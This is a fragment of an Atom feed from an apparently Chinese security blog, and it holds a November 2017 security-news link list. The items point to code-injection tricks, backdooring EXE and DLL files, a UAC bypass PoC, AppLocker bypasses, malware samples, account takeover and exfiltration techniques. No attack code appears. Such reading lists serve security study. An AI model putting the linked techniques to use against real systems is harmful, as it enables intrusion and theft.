&lt;li&gt;rootkit - 针对 Ubuntu 16.04 和 10.04 的 rootkit&lt;br&gt;&lt;a href=&quot;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20171106安全动态</title>
    <link href="http://kevien.github.io/2017/11/06/20171106%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/11/06/20171106安全动态/</id>
    <published>2017-11-06T02:23:46.000Z</published>
    <updated>2017-11-11T03:19:04.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="安全动态"><a href="#安全动态" class="headerlink" title="安全动态"></a>安全动态</h4><ul>
<li>PROPagate - 基于 SetWindowSubclass API 的代码注入新技巧<br><a href="http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/" target="_blank" rel="external">http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/</a></li>
<li>构建一个神经网络，从原始字节序列的角度检测恶意软件<br><a href="https://arxiv.org/abs/1710.09435" target="_blank" rel="external">https://arxiv.org/abs/1710.09435</a></li>
<li><p>利用BDF向EXE和DLL文件植入后门<br><a href="https://3gstudent.github.io/3gstudent.github.io/利用BDF向EXE文件植入后门/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/利用BDF向EXE文件植入后门/</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">也就是说往正规软件中植入后门成本还是很低的，都可以工具化了的、</div></pre></td></tr></table></figure>
</li>
<li><p>DriverMon - 监控驱动活动的工具，最近更新的版本可以记录 DeviceIoControl 和 IRP Data<br><a href="https://github.com/zodiacon/DriverMon" target="_blank" rel="external">https://github.com/zodiacon/DriverMon</a></p>
</li>
<li>node.js + postgres 从注入到Getshell<br><a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html" target="_blank" rel="external">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></li>
<li>SafeBreach Labs 研究员开源了一个恶意软件 Two-Stage Dropper 生成器<br><a href="http://www.ikotler.org/MalwaresFromThinBits.pdf" target="_blank" rel="external">http://www.ikotler.org/MalwaresFromThinBits.pdf</a></li>
<li>从汇编代码中看 Windows 64 位的 SEH（Structured Exception Handling）实现<br><a href="https://www.codeproject.com/Articles/1212332/bit-Structured-Exception-Handling-SEH-in-ASM" target="_blank" rel="external">https://www.codeproject.com/Articles/1212332/bit-Structured-Exception-Handling-SEH-in-ASM</a></li>
<li>任天堂 Switch 逆向工程<br><a href="https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering" target="_blank" rel="external">https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering</a></li>
<li>恶意子域名接管工具Subjack<br><a href="https://github.com/haccer/subjack" target="_blank" rel="external">https://github.com/haccer/subjack</a></li>
<li>绕过现代的进程检测机制<br><a href="http://riscy.business/2017/11/bypassing-modern-process-hollowing-detection/" target="_blank" rel="external">http://riscy.business/2017/11/bypassing-modern-process-hollowing-detection/</a></li>
<li>接管Instagram账户<br><a href="https://stefanovettorazzi.com/taking_over_instagram_accounts/" target="_blank" rel="external">https://stefanovettorazzi.com/taking_over_instagram_accounts/</a></li>
<li>AppLocker绕过列表<br><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/README.md" target="_blank" rel="external">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/README.md</a></li>
<li>Windows 平台多个 Crypter 恶意软件样本的收集<br><a href="https://github.com/malwares/Crypter" target="_blank" rel="external">https://github.com/malwares/Crypter</a></li>
<li>利用 FwCplLua COM 接口和 mscfile 注册表键劫持的方法 Bypass UAC，来自 hfiref0x 分享的 PoC 代码<br><a href="https://gist.github.com/hfiref0x/a044cb0ad425488e38556408b179cb61" target="_blank" rel="external">https://gist.github.com/hfiref0x/a044cb0ad425488e38556408b179cb61</a></li>
<li>通过像素颜色值编码数据以实现渗透测试中的数据回传<br><a href="https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/" target="_blank" rel="external">https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/</a></li>
<li>建立活动目录中的密罐账户<br><a href="https://jordanpotti.com/2017/11/06/honey-accounts/" target="_blank" rel="external">https://jordanpotti.com/2017/11/06/honey-accounts/</a></li>
<li>Striker - 信息收集与漏洞扫描工具<br><a href="https://github.com/UltimateHackers/Striker" target="_blank" rel="external">https://github.com/UltimateHackers/Striker</a></li>
<li>深渊背后的真相之薅羊毛产业报告<br><a href="http://www.freebuf.com/news/152525.html" target="_blank" rel="external">http://www.freebuf.com/news/152525.html</a></li>
<li>Node.js CVE-2017-14849 漏洞分析<br><a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/121</a></li>
<li>ctf中 可执行文件patch技术<br><a href="https://bbs.pediy.com/thread-222623.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222623.htm</a></li>
<li>当第三方组件变成邪恶之源<br><a href="https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y" target="_blank" rel="external">https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y</a></li>
<li>glibc malloc学习笔记之fastbin<br><a href="https://paper.seebug.org/445/" target="_blank" rel="external">https://paper.seebug.org/445/</a></li>
<li>Hyper-V安全从0到1<br><a href="https://bbs.pediy.com/thread-222626.htm" target="_blank" rel="external">https://bbs.pediy.com/thread-222626.htm</a></li>
<li><p>Drexel One API逆向工程<br><a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x68;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#x6d;&#101;&#x64;&#x69;&#117;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#64;&#x74;&#111;&#x6d;&#x65;&#114;&#x73;&#104;&#x65;&#x6d;&#x65;&#115;&#x68;&#x2f;&#114;&#101;&#x76;&#x65;&#x72;&#115;&#101;&#x2d;&#101;&#x6e;&#x67;&#105;&#x6e;&#101;&#x65;&#x72;&#x69;&#110;&#x67;&#45;&#116;&#104;&#101;&#x2d;&#100;&#x72;&#101;&#x78;&#101;&#x6c;&#45;&#x6f;&#x6e;&#x65;&#45;&#x61;&#x70;&#105;&#x2d;&#x33;&#x37;&#48;&#x61;&#53;&#x36;&#48;&#97;&#102;&#x65;&#x64;&#102;">&#x68;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#x6d;&#101;&#x64;&#x69;&#117;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#64;&#x74;&#111;&#x6d;&#x65;&#114;&#x73;&#104;&#x65;&#x6d;&#x65;&#115;&#x68;&#x2f;&#114;&#101;&#x76;&#x65;&#x72;&#115;&#101;&#x2d;&#101;&#x6e;&#x67;&#105;&#x6e;&#101;&#x65;&#x72;&#x69;&#110;&#x67;&#45;&#116;&#104;&#101;&#x2d;&#100;&#x72;&#101;&#x78;&#101;&#x6c;&#45;&#x6f;&#x6e;&#x65;&#45;&#x61;&#x70;&#105;&#x2d;&#x33;&#x37;&#48;&#x61;&#53;&#x36;&#48;&#97;&#102;&#x65;&#x64;&#102;</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mac上的逆向</div></pre></td></tr></table></figure>
</li>
<li><p>信息安全Cheat Sheets<br><a href="https://www.cybrary.it/0p3n/infosec-cheat-sheets/" target="_blank" rel="external">https://www.cybrary.it/0p3n/infosec-cheat-sheets/</a></p>
</li>
<li>新近出现的提权框架<br><a href="https://github.com/spencerdodd/kernelpop" target="_blank" rel="external">https://github.com/spencerdodd/kernelpop</a></li>
<li>Windows利用开发四：SEH覆写<br><a href="http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html" target="_blank" rel="external">http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html</a></li>
<li>DCOM与DDE的奇妙结合<br><a href="https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom" target="_blank" rel="external">https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom</a></li>
<li>二进制代码的模糊测试<br><a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#x6d;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#99;&#111;&#x6d;&#47;&#x40;&#110;&#x6a;&#x76;&#111;&#x73;&#x73;&#50;&#x39;&#x39;&#x2f;&#97;&#102;&#x6c;&#45;&#117;&#110;&#105;&#99;&#x6f;&#114;&#x6e;&#x2d;&#102;&#x75;&#122;&#122;&#105;&#x6e;&#x67;&#x2d;&#x61;&#114;&#x62;&#105;&#116;&#x72;&#97;&#114;&#x79;&#45;&#x62;&#105;&#x6e;&#x61;&#x72;&#x79;&#x2d;&#x63;&#111;&#x64;&#101;&#x2d;&#x35;&#x36;&#x33;&#x63;&#97;&#x32;&#x38;&#x39;&#51;&#x36;&#98;&#102;">&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#x6d;&#x65;&#x64;&#105;&#x75;&#x6d;&#46;&#99;&#111;&#x6d;&#47;&#x40;&#110;&#x6a;&#x76;&#111;&#x73;&#x73;&#50;&#x39;&#x39;&#x2f;&#97;&#102;&#x6c;&#45;&#117;&#110;&#105;&#99;&#x6f;&#114;&#x6e;&#x2d;&#102;&#x75;&#122;&#122;&#105;&#x6e;&#x67;&#x2d;&#x61;&#114;&#x62;&#105;&#116;&#x72;&#97;&#114;&#x79;&#45;&#x62;&#105;&#x6e;&#x61;&#x72;&#x79;&#x2d;&#x63;&#111;&#x64;&#101;&#x2d;&#x35;&#x36;&#x33;&#x63;&#97;&#x32;&#x38;&#x39;&#51;&#x36;&#98;&#102;</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;安全动态&quot;&gt;&lt;a href=&quot;#安全动态&quot; class=&quot;headerlink&quot; title=&quot;安全动态&quot;&gt;&lt;/a&gt;安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;PROPagate - 基于 SetWindowSubclass API 的代码注入新技巧&lt;br&gt;&lt;a href
    
    </summary>
    
    
  </entry>
  
</feed>
